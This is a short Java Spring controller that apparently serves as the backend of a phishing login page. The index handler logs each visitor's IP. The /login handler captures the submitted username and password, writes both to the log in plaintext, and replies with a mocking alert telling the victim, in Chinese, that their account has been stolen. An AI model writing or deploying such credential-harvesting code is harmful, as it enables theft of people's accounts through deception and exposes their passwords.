package com.xjy.adm;

import com.xjy.util.IpUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@Controller
public class IndexController {
    private static final Logger logger = LoggerFactory.getLogger(IndexController.class);

    @RequestMapping(value = {"/",""})
    public String index(HttpServletRequest request) {
        String ipAddr = IpUtil.getIpAddr(request);
        logger.info("user ip is {}", ipAddr);
        return "adm/index";
    }

    @PostMapping("/login")
    public void login(HttpServletRequest request, HttpServletResponse response) {
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        logger.info("account is {}", username);
        logger.info("pwd is {}", password);

        try {
            response.setContentType("text/html;charset=UTF-8");
            response.getWriter().write("<script>alert('笨蛋，你号被盗了!');history.back();</script>");
        } catch (IOException ioe) {
            logger.error(ioe.getMessage(), ioe);
        }

    }
}

